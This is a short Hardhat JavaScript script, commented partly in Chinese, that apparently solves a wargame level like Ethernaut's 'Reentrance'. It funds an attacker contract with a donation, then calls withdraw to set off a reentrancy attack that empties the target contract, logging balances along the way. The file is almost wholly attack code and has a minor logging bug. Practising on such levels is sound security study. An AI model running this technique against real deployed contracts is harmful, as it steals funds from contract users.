import hre from "hardhat";
const { ethers } = hre;

// 請將以下地址替換成部屬後的實例合約地址
const reentrance_address = "";
const reentranceAttacker_address = "";
console.log("目標 Reentrance 實例合約地址:", reentrance_address);
console.log("目標 ReentranceAttacker 實例合約地址:", reentranceAttacker_address);

const [signer] = await ethers.getSigners();
console.log("我的帳戶地址: ", signer.address);

// 取得合約實例
const reentrance = await ethers.getContractAt("Reentrance", reentrance_address);
const reentranceAttacker = await ethers.getContractAt("ReentranceAttacker", reentranceAttacker_address);

async function main() {
    const balance = await reentranceAttacker.balanceOf(signer.address);
    console.log("我目前在 Reentrance 的餘額: ", balance);

    const reentrance_balance = await ethers.provider.getBalance(reentrance_address);
    console.log("Reentrance 的餘額: ", reentrance_balance);

    // Step 1: Donate to the target via the attacker contract.
    const value = ethers.parseEther("0.0012");
    console.log("Sending transaction to donate()...");
    const tx = await reentranceAttacker.donate(signer.address, {
        value: value
    });
    // 等待交易確認
    console.log("交易發送中，交易哈希:", tx.hash);
    const receipt = await tx.wait();
    console.log("交易確認，區塊號:", receipt.blockNumber);

    // Optional: Check the updated balance in the target contract.
    const balance1 = await reentranceAttacker.balanceOf(signer.address);
    console.log("Balance of attacker in target contract:", balance.toString());

    // Step 2: Call withdraw to launch the reentrancy attack.
    console.log("Initiating reentrancy attack via withdraw...");
    const withdrawTx = await reentranceAttacker.withdraw(ethers.parseEther("0.0012"));
    await withdrawTx.wait();
    console.log("Reentrancy attack completed.");

    console.log("Reentrance 的餘額: ", await ethers.provider.getBalance(reentrance_address));

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });